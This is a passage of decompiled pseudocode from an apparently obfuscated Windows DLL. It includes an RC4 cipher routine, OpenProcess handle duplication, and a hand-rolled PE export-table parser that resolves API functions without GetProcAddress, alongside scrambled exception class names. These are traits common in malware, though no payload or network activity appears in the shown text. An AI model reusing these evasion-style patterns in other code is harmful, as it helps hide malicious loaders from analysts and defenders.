  (*(void (__thiscall **)(void *, int, int))(*(_DWORD *)this + 12))(this, a3, a2);
  return a2;
}

//----- (100258BB) --------------------------------------------------------
int __thiscall sub_100258BB(void *this, int a2, int a3)
{
  sub_1000C28D(*(void **)(a3 + 12), a2, 0);
  (*(void (__thiscall **)(void *, int, int))(*(_DWORD *)this + 12))(this, a3, a2);
  return a2;
}

//----- (10025908) --------------------------------------------------------
int __thiscall sub_10025908(void *this, int a2, int a3)
{
  sub_1000C28D(*(void **)(a3 + 12), a2, 0);
  (*(void (__thiscall **)(void *, int, int))(*(_DWORD *)this + 12))(this, a3, a2);
  return a2;
}

//----- (1002594E) --------------------------------------------------------
unsigned int __thiscall sub_1002594E(void *this, int pExceptionObject, int a3)
{
  unsigned int v3; // esi
  unsigned int v4; // eax
  unsigned int result; // eax
  int v6; // et2

  v3 = pExceptionObject;
  if ( pExceptionObject != a3
    || (v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 16))(this), v6 = v3 % v4, result = v3 / v4, v6) )
  {
    sub_1000DEEF(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return result;
}

//----- (10025986) --------------------------------------------------------
int __cdecl sub_10025986(int a1, int a2)
{
  int v2; // ecx
  int v3; // edx
  int i; // eax
  char v5; // al
  char *v6; // edi
  int result; // eax
  int j; // [esp+0h] [ebp-8h]
  unsigned __int8 v9; // [esp+7h] [ebp-1h]

  LOBYTE(v3) = 0;
  for ( i = 0; i < 256; ++i )
    *(_BYTE *)(i + v2) = i;
  *(_BYTE *)(v2 + 256) = 0;
  *(_BYTE *)(v2 + 257) = 0;
  v9 = 0;
  for ( j = 0; j < 256; ++j )
  {
    v5 = *(_BYTE *)(j + v2);
    v9 += v5 + *(_BYTE *)((unsigned __int8)v3 + a1);
    v6 = (char *)(v2 + v9);
    *(_BYTE *)(j + v2) = *v6;
    byte_10095018 = v5;
    *v6 = v5;
    result = ((unsigned __int8)v3 + 1) / a2;
    v3 = ((unsigned __int8)v3 + 1) % a2;
  }
  return result;
}
// 1002598F: variable 'v2' is possibly undefined
// 10095018: using guessed type char byte_10095018;

//----- (100259EE) --------------------------------------------------------
int __usercall sub_100259EE@<eax>(int result@<eax>, int a2, unsigned int a3)
{
  unsigned int i; // edi
  char v4; // dl
  char *v5; // esi
  char v6; // cl

  for ( i = 0; i < a3; ++i )
  {
    v4 = *(_BYTE *)((unsigned __int8)++*(_BYTE *)(result + 256) + result);
    *(_BYTE *)(result + 257) += v4;
    v5 = (char *)(*(unsigned __int8 *)(result + 257) + result);
    v6 = *v5;
    *v5 = v4;
    *(_BYTE *)(*(unsigned __int8 *)(result + 256) + result) = v6;
    *(_BYTE *)(i + a2) ^= *(_BYTE *)((unsigned __int8)(v4 + v6) + result);
  }
  return result;
}

//----- (10025A41) --------------------------------------------------------
int __stdcall sub_10025A41(int a1, int a2, char a3)
{
  int v3; // edx

  sub_10025BDE(a1);
  *(_DWORD *)(v3 + 8) = a2;
  *(_DWORD *)v3 = &off_1007451C;
  *(_BYTE *)(v3 + 12) = a3;
  return v3;
}
// 10025A5D: variable 'v3' is possibly undefined
// 1007451C: using guessed type int (__thiscall *off_1007451C)(void *Block, char);

//----- (10025A7A) --------------------------------------------------------
_BYTE *__thiscall sub_10025A7A(_BYTE *Block, char a2)
{
  sub_10025A99(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10025A99) --------------------------------------------------------
void __thiscall sub_10025A99(_BYTE *this)
{
  *(_DWORD *)this = &off_1007451C;
  sub_10025AE7(this);
  sub_10025C2C(this);
}
// 1007451C: using guessed type int (__thiscall *off_1007451C)(void *Block, char);

//----- (10025ADB) --------------------------------------------------------
int __thiscall sub_10025ADB(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 24))(v1);
}

//----- (10025AE7) --------------------------------------------------------
int __thiscall sub_10025AE7(_BYTE *this)
{
  int result; // eax
  bool v3; // zf
  int v4; // eax

  result = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 36))(this);
  if ( !(_BYTE)result )
  {
    v3 = this[12] == 0;
    this[4] = 1;
    if ( !v3 )
    {
      v4 = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 44))(this);
      return (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 32))(v4);
    }
  }
  return result;
}

//----- (10025B0D) --------------------------------------------------------
int __thiscall sub_10025B0D(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 16))(v1);
}

//----- (10025B1D) --------------------------------------------------------
int __thiscall sub_10025B1D(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 12))(v1);
}

//----- (10025B2D) --------------------------------------------------------
int __thiscall sub_10025B2D(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 28))(v1);
}

//----- (10025B39) --------------------------------------------------------
int __thiscall sub_10025B39(_DWORD *this)
{
  return this[2];
}

//----- (10025B3D) --------------------------------------------------------
BOOL __thiscall sub_10025B3D(void *this)
{
  int v2; // eax
  BOOL result; // eax

  result = 0;
  if ( (*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 48))(this) )
  {
    v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v2 + 40))(v2) )
      return 1;
  }
  return result;
}

//----- (10025B64) --------------------------------------------------------
int __thiscall sub_10025B64(void *this)
{
  int v2; // eax
  _DWORD pExceptionObject[2]; // [esp+4h] [ebp-8h] BYREF

  if ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 40))(this) )
  {
    sub_1000E1AC(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
  }
  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 4))(v2);
}
// 10025B64: using guessed type _DWORD pExceptionObject[2];

//----- (10025B9D) --------------------------------------------------------
int __thiscall sub_10025B9D(void *this, int a2, int a3)
{
  int v4; // eax
  _DWORD pExceptionObject[2]; // [esp+4h] [ebp-8h] BYREF

  if ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 40))(this) )
  {
    sub_1000E1AC(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
  }
  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v4 + 8))(v4, a2, a3);
}
// 10025B9D: using guessed type _DWORD pExceptionObject[2];

//----- (10025BDE) --------------------------------------------------------
int __stdcall sub_10025BDE(int a1)
{
  int result; // eax

  result = a1;
  *(_DWORD *)a1 = &off_10074AD0;
  *(_DWORD *)a1 = &off_10074550;
  *(_BYTE *)(a1 + 4) = 0;
  return result;
}
// 10074550: using guessed type int (__thiscall *off_10074550)(void *Block, char);
// 10074AD0: using guessed type int (__thiscall *off_10074AD0)(void *Block, char);

//----- (10025C0D) --------------------------------------------------------
_BYTE *__thiscall sub_10025C0D(_BYTE *Block, char a2)
{
  sub_10025C2C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10025C2C) --------------------------------------------------------
void __thiscall sub_10025C2C(_BYTE *this)
{
  *(_DWORD *)this = &off_10074550;
  this[4] = 1;
  *(_DWORD *)this = &off_10074AD0;
}
// 10074550: using guessed type int (__thiscall *off_10074550)(void *Block, char);
// 10074AD0: using guessed type int (__thiscall *off_10074AD0)(void *Block, char);

//----- (10025C70) --------------------------------------------------------
void __thiscall sub_10025C70(_BYTE *this)
{
  this[4] = 1;
}

//----- (10025C75) --------------------------------------------------------
int __thiscall sub_10025C75(int *this, _DWORD *a2)
{
  int v3; // eax
  int v5; // ebx
  int v6; // eax
  int v8; // [esp+8h] [ebp-8h]
  int v9; // [esp+Ch] [ebp-4h]
  char v10; // [esp+1Bh] [ebp+Bh]

  v9 = 0;
  v3 = a2[3];
  v8 = v3;
  v10 = *(_BYTE *)(a2[1] + 8);
  if ( v3 > 0 )
  {
    do
    {
      v5 = *this;
      v6 = sub_1000C50A(a2);
      if ( !(*(int (__thiscall **)(int *, int))(v5 + 16))(this, v9 + v6) )
        break;
      ++v9;
      if ( !(*(int (__thiscall **)(int *))(*this + 24))(this) )
        break;
    }
    while ( v9 < v8 );
  }
  if ( v10 )
    *(_BYTE *)(a2[1] + 8) = 1;
  return v9;
}

//----- (10025CDC) --------------------------------------------------------
void __thiscall sub_10025CDC(void *this, int *a2)
{
  unsigned int v2; // ebx
  unsigned int i; // esi
  int v4; // eax
  int v5[5]; // [esp+10h] [ebp-28h] BYREF
  int pExceptionObject; // [esp+24h] [ebp-14h] BYREF
  void *v7; // [esp+28h] [ebp-10h]
  int v8; // [esp+34h] [ebp-4h]

  v7 = this;
  v2 = a2[3];
  for ( i = 0; i < v2; v2 = a2[3] )
  {
    sub_1000C73C(v2 - i, a2, (int)v5, i);
    v8 = 0;
    v4 = (*(int (__thiscall **)(void *, int *))(*(_DWORD *)v7 + 12))(v7, v5);
    if ( !v4 )
    {
      sub_1000EA5A(&pExceptionObject);
      _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVNxgFdIyuzpwZmeagwnxg_yq_sr__);
    }
    i += v4;
    v8 = -1;
    sub_1000C45D(v5);
  }
}
// 10025CDC: using guessed type int var_28[5];

//----- (10025D4C) --------------------------------------------------------
char __thiscall sub_10025D4C(_BYTE *this)
{
  return this[4];
}

//----- (10025D50) --------------------------------------------------------
int __userpurge sub_10025D50@<eax>(int a1@<esi>, void *a2, char a3, BOOL a4, DWORD a5, DWORD a6)
{
  *(_DWORD *)(a1 + 4) = 0;
  *(_DWORD *)a1 = off_100735BC;
  sub_10014EC9((HANDLE *)a1, a2, a3, a4, a5, a6);
  return a1;
}
// 100735BC: using guessed type int (__thiscall *off_100735BC[2])(void *Block, char);

//----- (10025D79) --------------------------------------------------------
bool __usercall sub_10025D79@<al>(int a1@<eax>)
{
  return CloseHandle(*(HANDLE *)(a1 + 4));
}

//----- (10025DCB) --------------------------------------------------------
bool __usercall sub_10025DCB@<al>(int a1@<eax>)
{
  return FreeLibrary(*(HMODULE *)(a1 + 4));
}

//----- (10025DF7) --------------------------------------------------------
bool __usercall sub_10025DF7@<al>(int a1@<eax>)
{
  return FindCloseUrlCache(*(HANDLE *)(a1 + 4));
}

//----- (10025E23) --------------------------------------------------------
bool __usercall sub_10025E23@<al>(int a1@<eax>)
{
  return FindClose(*(HANDLE *)(a1 + 4));
}

//----- (10025E32) --------------------------------------------------------
_DWORD *__usercall sub_10025E32@<eax>(int a1@<edi>, _DWORD *a2@<esi>)
{
  a2[1] = 0;
  *a2 = off_10074268;
  sub_10026389((int)a2, a1);
  return a2;
}
// 10074268: using guessed type int (__thiscall *off_10074268[5])(void *Block, char);

//----- (10025E46) --------------------------------------------------------
char __thiscall sub_10025E46(void *this, int a2)
{
  sub_1001CFDC(*(HKEY *)(a2 + 4), (int)this);
  return 1;
}

//----- (10025E7D) --------------------------------------------------------
_DWORD *__usercall sub_10025E7D@<eax>(int a1@<edi>, _DWORD *a2@<esi>)
{
  a2[1] = 0;
  *a2 = off_10073DE0;
  sub_100263BE((int)a2, a1);
  return a2;
}
// 10073DE0: using guessed type int (__thiscall *off_10073DE0[5])(void *Block, char);

//----- (10025E91) --------------------------------------------------------
char __thiscall sub_10025E91(HDC *this)
{
  HWND v2; // eax

  v2 = WindowFromDC(this[1]);
  ReleaseDC(v2, this[1]);
  return 1;
}

//----- (10025ED0) --------------------------------------------------------
_DWORD *__usercall sub_10025ED0@<eax>(_DWORD *a1@<esi>)
{
  a1[1] = 0;
  *a1 = off_10073DE4;
  sub_1001977B((int)a1, 0);
  return a1;
}
// 10073DE4: using guessed type int (__thiscall *off_10073DE4[4])(void *Block, char);

//----- (10025EE8) --------------------------------------------------------
char __stdcall sub_10025EE8(int a1)
{
  DeleteDC(*(HDC *)(a1 + 4));
  return 1;
}

//----- (10025F20) --------------------------------------------------------
_DWORD *__usercall sub_10025F20@<eax>(_DWORD *a1@<esi>)
{
  a1[1] = 0;
  *a1 = off_10073DE8;
  sub_100197E1((int)a1, 0);
  return a1;
}
// 10073DE8: using guessed type int (__thiscall *off_10073DE8[3])(void *Block, char);

//----- (10025F38) --------------------------------------------------------
char __stdcall sub_10025F38(int a1)
{
  DeleteObject(*(HGDIOBJ *)(a1 + 4));
  return 1;
}

//----- (10025F70) --------------------------------------------------------
_DWORD *__usercall sub_10025F70@<eax>(_DWORD *a1@<esi>)
{
  a1[1] = 0;
  *a1 = off_100745B0;
  sub_10026424((int)a1, 0);
  return a1;
}
// 100745B0: using guessed type int (__thiscall *off_100745B0[2])(void *Block, char);

//----- (10025F88) --------------------------------------------------------
bool __usercall sub_10025F88@<al>(int a1@<eax>)
{
  return UnmapViewOfFile(*(LPCVOID *)(a1 + 4));
}

//----- (10025F97) --------------------------------------------------------
_DWORD *__usercall sub_10025F97@<eax>(_DWORD *a1@<esi>)
{
  a1[1] = 0;
  *a1 = &off_10074068;
  sub_1001B2E1((int)a1, 0);
  return a1;
}
// 10074068: using guessed type int (__thiscall *off_10074068)(void *Block, char);

//----- (10025FAF) --------------------------------------------------------
bool __usercall sub_10025FAF@<al>(int a1@<eax>)
{
  return LocalFree(*(HLOCAL *)(a1 + 4)) == 0;
}

//----- (10025FBF) --------------------------------------------------------
void __cdecl sub_10025FBF(HANDLE hSourceHandle, BOOL bInheritHandle, DWORD dwProcessId)
{
  HANDLE v3; // eax
  HANDLE pExceptionObject[5]; // [esp+10h] [ebp-38h] BYREF
  DWORD v5; // [esp+2Ch] [ebp-1Ch]
  DWORD CurrentProcessId; // [esp+30h] [ebp-18h]
  HANDLE TargetHandle; // [esp+34h] [ebp-14h]
  int v8; // [esp+44h] [ebp-4h]

  TargetHandle = (HANDLE)-1;
  CurrentProcessId = GetCurrentProcessId();
  v5 = GetCurrentProcessId();
  v3 = OpenProcess(0x40u, 0, dwProcessId);
  pExceptionObject[3] = off_100735BC;
  pExceptionObject[4] = 0;
  sub_10014EC9(v3, 0, 0, v5, CurrentProcessId);
  v8 = 0;
  sub_1000E2E3(pExceptionObject, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
}
// 10026010: conditional instruction was optimized away because %hSourceProcessHandle.4==0
// 10014EC9: using guessed type _DWORD __stdcall sub_10014EC9(HANDLE hSourceHandle, char, BOOL bInheritHandle, DWORD dwProcessId, DWORD);
// 100735BC: using guessed type int (__thiscall *off_100735BC[2])(void *Block, char);

//----- (1002609C) --------------------------------------------------------
void __noreturn sub_1002609C()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_1000E1AC(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 1002609C: using guessed type void __noreturn sub_1002609C();
// 1002609C: using guessed type _DWORD pExceptionObject[2];

//----- (100260B9) --------------------------------------------------------
void __noreturn sub_100260B9()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_1000E1AC(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 100260B9: using guessed type void __noreturn sub_100260B9();
// 100260B9: using guessed type _DWORD pExceptionObject[2];

//----- (100260D6) --------------------------------------------------------
void __noreturn sub_100260D6()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_1000E1AC(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 100260D6: using guessed type void __noreturn sub_100260D6();
// 100260D6: using guessed type _DWORD pExceptionObject[2];

//----- (100261A1) --------------------------------------------------------
_DWORD *__thiscall sub_100261A1(_DWORD *Block, char a2)
{
  sub_1002621D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100261C0) --------------------------------------------------------
_DWORD *__thiscall sub_100261C0(_DWORD *Block, char a2)
{
  sub_100262A3(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100261DF) --------------------------------------------------------
_DWORD *__thiscall sub_100261DF(_DWORD *Block, char a2)
{
  sub_10026316(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100261FE) --------------------------------------------------------
_DWORD *__thiscall sub_100261FE(_DWORD *Block, char a2)
{
  sub_100263F3(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002621D) --------------------------------------------------------
bool __thiscall sub_1002621D(_DWORD *this)
{
  *this = off_100745A4;
  return sub_10026459((int)this);
}
// 100745A4: using guessed type int (__thiscall *off_100745A4[5])(void *Block, char);

//----- (1002624E) --------------------------------------------------------
BOOL __usercall sub_1002624E@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 && v1 != -1;
}

//----- (10026261) --------------------------------------------------------
char __userpurge sub_10026261@<al>(int a1@<eax>, int a2@<edi>, char a3)
{
  int v3; // esi
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v3 = a1;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(a1) = sub_10026459(a1);
    if ( !(_BYTE)a1 )
    {
      sub_1000E2E3(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  if ( a3 )
    sub_1002609C();
  *(_DWORD *)(v3 + 4) = a2;
  return a1;
}
// 1002609C: using guessed type void __noreturn sub_1002609C(void);
// 10026261: using guessed type _DWORD pExceptionObject[3];

//----- (100262A3) --------------------------------------------------------
bool __thiscall sub_100262A3(_DWORD *this)
{
  *this = off_100745AC;
  return sub_10026473((int)this);
}
// 100745AC: using guessed type int (__thiscall *off_100745AC[3])(void *Block, char);

//----- (100262D4) --------------------------------------------------------
char __userpurge sub_100262D4@<al>(int a1@<eax>, int a2@<edi>, char a3)
{
  int v3; // esi
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v3 = a1;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(a1) = sub_10026473(a1);
    if ( !(_BYTE)a1 )
    {
      sub_1000E2E3(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  if ( a3 )
    sub_100260B9();
  *(_DWORD *)(v3 + 4) = a2;
  return a1;
}
// 100260B9: using guessed type void __noreturn sub_100260B9(void);
// 100262D4: using guessed type _DWORD pExceptionObject[3];

//----- (10026316) --------------------------------------------------------
bool __thiscall sub_10026316(_DWORD *this)
{
  *this = off_100745A8;
  return sub_1002648D((int)this);
}
// 100745A8: using guessed type int (__thiscall *off_100745A8[4])(void *Block, char);

//----- (10026347) --------------------------------------------------------
char __userpurge sub_10026347@<al>(int a1@<eax>, int a2@<edi>, char a3)
{
  int v3; // esi
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v3 = a1;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(a1) = sub_1002648D(a1);
    if ( !(_BYTE)a1 )
    {
      sub_1000E2E3(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  if ( a3 )
    sub_100260D6();
  *(_DWORD *)(v3 + 4) = a2;
  return a1;
}
// 100260D6: using guessed type void __noreturn sub_100260D6(void);
// 10026347: using guessed type _DWORD pExceptionObject[3];

//----- (10026389) --------------------------------------------------------
char __usercall sub_10026389@<al>(int a1@<eax>, int a2@<edi>)
{
  int v2; // esi
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v2 = a1;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(a1) = sub_1001DCD1(a1);
    if ( !(_BYTE)a1 )
    {
      sub_1000E2E3(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  *(_DWORD *)(v2 + 4) = a2;
  return a1;
}
// 10026389: using guessed type _DWORD pExceptionObject[3];

//----- (100263BE) --------------------------------------------------------
char __usercall sub_100263BE@<al>(int a1@<eax>, int a2@<edi>)
{
  int v2; // esi
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v2 = a1;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(a1) = sub_10019873(a1);
    if ( !(_BYTE)a1 )
    {
      sub_1000E2E3(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  *(_DWORD *)(v2 + 4) = a2;
  return a1;
}
// 100263BE: using guessed type _DWORD pExceptionObject[3];

//----- (100263F3) --------------------------------------------------------
bool __thiscall sub_100263F3(_DWORD *this)
{
  *this = off_100745B0;
  return sub_100264A7((int)this);
}
// 100745B0: using guessed type int (__thiscall *off_100745B0[2])(void *Block, char);

//----- (10026424) --------------------------------------------------------
char __usercall sub_10026424@<al>(int a1@<eax>, int a2@<edi>)
{
  int v2; // esi
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v2 = a1;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(a1) = sub_100264A7(a1);
    if ( !(_BYTE)a1 )
    {
      sub_1000E2E3(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  *(_DWORD *)(v2 + 4) = a2;
  return a1;
}
// 10026424: using guessed type _DWORD pExceptionObject[3];

//----- (10026459) --------------------------------------------------------
bool __usercall sub_10026459@<al>(int a1@<esi>)
{
  bool result; // al

  if ( !sub_1002624E(a1) )
    return 1;
  result = sub_10025DCB(a1);
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (10026473) --------------------------------------------------------
bool __usercall sub_10026473@<al>(int a1@<esi>)
{
  bool result; // al

  if ( !sub_100264C1(a1) )
    return 1;
  result = sub_10025DF7(a1);
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (1002648D) --------------------------------------------------------
bool __usercall sub_1002648D@<al>(int a1@<esi>)
{
  bool result; // al

  if ( !sub_100264D4(a1) )
    return 1;
  result = sub_10025E23(a1);
  *(_DWORD *)(a1 + 4) = -1;
  return result;
}

//----- (100264A7) --------------------------------------------------------
bool __usercall sub_100264A7@<al>(int a1@<esi>)
{
  bool result; // al

  if ( !sub_100264E7(a1) )
    return 1;
  result = sub_10025F88(a1);
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (100264C1) --------------------------------------------------------
BOOL __usercall sub_100264C1@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 && v1 != -1;
}

//----- (100264D4) --------------------------------------------------------
BOOL __usercall sub_100264D4@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 != -1 && v1;
}

//----- (100264E7) --------------------------------------------------------
BOOL __usercall sub_100264E7@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 && v1 != -1;
}

//----- (10026526) --------------------------------------------------------
HMODULE __cdecl sub_10026526(LPCSTR lpModuleName)
{
  return GetModuleHandleA(lpModuleName);
}

//----- (10026534) --------------------------------------------------------
HMODULE __cdecl sub_10026534(LPCWSTR lpModuleName)
{
  return GetModuleHandleW(lpModuleName);
}

//----- (10026542) --------------------------------------------------------
HMODULE __cdecl sub_10026542(int a1, int a2)
{
  HMODULE v2; // esi
  _DWORD pExceptionObject[6]; // [esp+10h] [ebp-18h] BYREF

  pExceptionObject[5] = 0;
  v2 = sub_10026534(*(LPCWSTR *)(a2 + 12));
  if ( !v2 )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_10009F65(&a1);
  return v2;
}

//----- (10026590) --------------------------------------------------------
char *__cdecl sub_10026590(char *lp, int a2)
{
  const CHAR *v2; // eax
  char *v3; // esi
  _DWORD pExceptionObject[6]; // [esp+10h] [ebp-18h] BYREF

  pExceptionObject[5] = 0;
  v2 = (const CHAR *)sub_10009FE5((int)&a2);
  v3 = sub_100266E9(lp, v2);
  if ( !v3 )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_10009F65(&a2);
  return v3;
}

//----- (100265E5) --------------------------------------------------------
char *__cdecl sub_100265E5(int a1, int a2, int a3)
{
  int v3; // ecx
  char *v4; // eax
  char *v5; // esi
  int v7; // [esp-8h] [ebp-34h] BYREF
  int v8; // [esp-4h] [ebp-30h]
  int v9[10]; // [esp+0h] [ebp-2Ch] BYREF
  int v10; // [esp+28h] [ebp-4h]

  v10 = 1;
  v9[7] = (int)v9;
  sub_10009F32(v9, (int)&a3);
  LOBYTE(v10) = 2;
  v8 = v3;
  v7 = v3;
  v9[6] = (int)&v7;
  sub_10009F32(&v7, (int)&a1);
  LOBYTE(v10) = 2;
  v4 = (char *)sub_10026542(v7, v8);
  LOBYTE(v10) = 1;
  v5 = sub_10026590(v4, v9[0]);
  LOBYTE(v10) = 0;
  sub_10009F65(&a1);
  v10 = -1;
  sub_10009F65(&a3);
  return v5;
}
// 1002660D: variable 'v3' is possibly undefined

//----- (1002665C) --------------------------------------------------------
void __usercall sub_1002665C(_DWORD *a1@<esi>, HMODULE hModule)
{
  void *pExceptionObject[5]; // [esp+10h] [ebp-22Ch] BYREF
  WCHAR Filename[266]; // [esp+24h] [ebp-218h] BYREF
  int v4; // [esp+238h] [ebp-4h]

  pExceptionObject[4] = 0;
  pExceptionObject[3] = a1;
  if ( !GetModuleFileNameW(hModule, Filename, 0x104u) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_10009D2C(a1, Filename);
  v4 = 0;
  sub_10056753();
}

//----- (100266D3) --------------------------------------------------------
_BYTE *__usercall sub_100266D3@<eax>(_BYTE *result@<eax>)
{
  while ( *result )
  {
    if ( *result == 46 )
      return result;
    ++result;
  }
  return 0;
}

//----- (100266E9) --------------------------------------------------------
char *__cdecl sub_100266E9(char *lp, LPCSTR lpsz)
{
  char *v2; // esi
  int v3; // eax
  char *v4; // esi
  char *v5; // ebx
  CHAR *v7; // ebx
  _BYTE *v8; // eax
  unsigned __int16 v9; // ax
  int v10; // esi
  HMODULE ModuleHandleA; // edi
  const CHAR *v12; // esi
  char *v13; // [esp+10h] [ebp-124h]
  int v14; // [esp+14h] [ebp-120h]
  int ucb; // [esp+18h] [ebp-11Ch]
  char *v16; // [esp+1Ch] [ebp-118h]
  LPCSTR lpString1; // [esp+20h] [ebp-114h]
  int v18; // [esp+24h] [ebp-110h]
  CHAR String1[264]; // [esp+28h] [ebp-10Ch] BYREF

  if ( IsBadReadPtr(lp, 4u) )
    return 0;
  if ( IsBadStringPtrA(lpsz, 0xFFu) )
    return 0;
  ucb = lstrlenA(lpsz);
  if ( *(_WORD *)lp != 23117 )
    return 0;
  v2 = &lp[*((_DWORD *)lp + 15) + 24];
  if ( IsBadReadPtr(v2, 4u) )
    return 0;
  if ( *(_WORD *)v2 != 267 )
    return 0;
  v3 = *((_DWORD *)v2 + 24);
  v14 = *((_DWORD *)v2 + 25);
  if ( !v3 )
    return 0;
  v18 = 0;
  v4 = &lp[v3];
  v13 = &lp[*(_DWORD *)&lp[v3 + 36]];
  v5 = &lp[*(_DWORD *)&lp[v3 + 32]];
  v16 = &lp[*(_DWORD *)&lp[v3 + 28]];
  if ( !*(_DWORD *)&lp[v3 + 24] )
    return 0;
  while ( 1 )
  {
    lpString1 = &lp[*(_DWORD *)&v5[4 * v18]];
    if ( !IsBadReadPtr(lpString1, ucb) && !lstrcmpiA(lpString1, lpsz) )
      break;
    if ( (unsigned int)++v18 >= *((_DWORD *)v4 + 6) )
      return 0;
  }
  v7 = &lp[*(_DWORD *)&v16[4 * *(unsigned __int16 *)&v13[2 * v18]]];
  if ( v7 >= v4 && v7 <= &v4[v14] )
  {
    v8 = sub_100266D3(v7);
    if ( v8 )
    {
      v9 = (_WORD)v8 - (_WORD)v7;
      if ( v9 <= 0x104u )
      {
        if ( v9 )
        {
          v10 = v9;
          if ( lstrcpynA(String1, v7, v9 + 1) )
          {
            String1[v10] = 0;
            ModuleHandleA = GetModuleHandleA(String1);
            if ( ModuleHandleA )
            {
